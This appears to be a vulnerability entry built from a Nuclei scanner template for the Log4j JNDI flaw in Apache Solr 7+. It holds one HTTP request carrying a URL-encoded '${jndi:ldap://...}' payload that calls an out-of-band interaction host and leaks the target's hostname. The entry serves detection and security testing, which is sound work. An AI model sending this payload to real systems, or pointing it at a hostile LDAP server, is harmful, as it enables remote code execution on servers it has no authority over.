# Vulnerability: Apache Solr 7+ - Remote Code Execution (Apache Log4j)
**Classification:** CWE-94,CWE-917
**Source:** Nuclei Template (`apache-solr-log4j-rce.yaml`)

## Description
Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. This vulnerability affects Solr 7+.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 25s
GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D HTTP/1.1
Host: {{Hostname}}
```

